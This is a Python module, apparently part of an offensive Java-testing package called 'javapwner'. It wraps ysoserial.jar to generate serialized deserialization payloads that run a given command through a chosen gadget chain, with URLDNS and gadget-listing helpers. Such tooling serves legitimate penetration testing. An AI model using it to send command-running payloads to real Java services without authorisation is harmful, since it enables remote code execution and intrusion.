"""YsoserialWrapper — subprocess-based interface to ysoserial.jar."""

from __future__ import annotations

import os
import re
import subprocess
from functools import cached_property
from pathlib import Path

from javapwner.exceptions import PayloadError

# Ysoserial exits with code 1 even when just printing help/gadget list.
_GADGET_PATTERN = re.compile(r"^\s{3,}(\w+)\s+@\w+", re.MULTILINE)

_TIMEOUT_GENERATE = 30  # seconds


def _find_ysoserial_jar() -> Path | None:
    """Locate ysoserial.jar using the documented search order."""
    # 1. Environment variable
    env_path = os.environ.get("YSOSERIAL_PATH")
    if env_path:
        p = Path(env_path)
        if p.is_file():
            return p

    # 2. lib/ysoserial.jar relative to this file's package root
    pkg_root = Path(__file__).resolve().parent.parent.parent  # project root
    candidate = pkg_root / "lib" / "ysoserial.jar"
    if candidate.is_file():
        return candidate

    # 3. CWD
    cwd_candidate = Path.cwd() / "ysoserial.jar"
    if cwd_candidate.is_file():
        return cwd_candidate

    return None


class YsoserialWrapper:
    """Thin wrapper around ysoserial invoked via subprocess."""

    def __init__(self, jar_path: str | Path | None = None):
        if jar_path is not None:
            self._jar = Path(jar_path)
        else:
            found = _find_ysoserial_jar()
            if found is None:
                raise PayloadError(
                    "ysoserial.jar not found. Set YSOSERIAL_PATH env var, "
                    "place it in lib/ysoserial.jar, or put it in CWD."
                )
            self._jar = found

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate(self, gadget: str, command: str) -> bytes:
        """Generate a serialized payload for *gadget* executing *command*.

        Returns the raw bytes of the payload. Raises :class:`PayloadError`
        on failure, empty output, or timeout.
        """
        try:
            result = subprocess.run(
                ["java", "-jar", str(self._jar), gadget, command],
                capture_output=True,
                timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError(f"ysoserial timed out after {_TIMEOUT_GENERATE}s") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

        payload = result.stdout
        if not payload:
            stderr_hint = result.stderr.decode(errors="replace")[:200]
            raise PayloadError(
                f"ysoserial returned empty payload for gadget '{gadget}'. "
                f"Stderr: {stderr_hint}"
            )
        return payload

    def generate_urldns(self, url: str) -> bytes:
        """Convenience wrapper for the URLDNS gadget (no Java needed on target)."""
        return self.generate("URLDNS", url)

    @cached_property
    def _gadget_list(self) -> list[str]:
        try:
            result = subprocess.run(
                ["java", "-jar", str(self._jar)],
                capture_output=True,
                timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("ysoserial timed out while listing gadgets") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

        # ysoserial prints the gadget table to stderr
        output = result.stderr.decode(errors="replace")
        gadgets = _GADGET_PATTERN.findall(output)
        return gadgets

    def list_gadgets(self) -> list[str]:
        """Return the list of available gadget chain names."""
        return list(self._gadget_list)

    def validate_gadget(self, gadget: str) -> bool:
        """Return True if *gadget* is present in the ysoserial gadget list."""
        return gadget in self._gadget_list
